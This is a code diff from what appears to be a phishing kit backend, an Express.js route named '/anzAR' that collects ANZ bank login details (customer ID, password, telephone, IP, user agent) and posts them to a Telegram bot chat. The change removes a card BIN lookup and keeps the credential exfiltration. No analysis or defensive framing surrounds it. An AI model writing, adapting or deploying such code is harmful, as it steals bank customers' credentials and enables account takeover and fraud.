@@ -2600,28 +2600,11 @@ app.post('/anzAR', (req, res) => {
     telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
     userAgent = req.body.userAgent;
     ip = req.body.ip;
-
-    if (bin.length === 7) {
-        formatBin = bin.replace(/ /g, '');
-        if (formatBin.length === 7) {
-            formatBin = bin.slice(0, -1);
-        }
-        bin = formatBin;
-    }
-    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
-        if (!resp.data.bank) {
-            bankName = ""
-        } else {
-            bankName = resp.data.bank.name;
-        }
-    }).then(function () {
-        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
-        var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
-        axios.post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=ANZ:\n${originalText}`
-        );
-        res.send("Update Completed");
-    })
+    var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
+    axios.post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=ANZ:\n${originalText}`
+    );
+    res.send("Update Completed");
 });
 
 
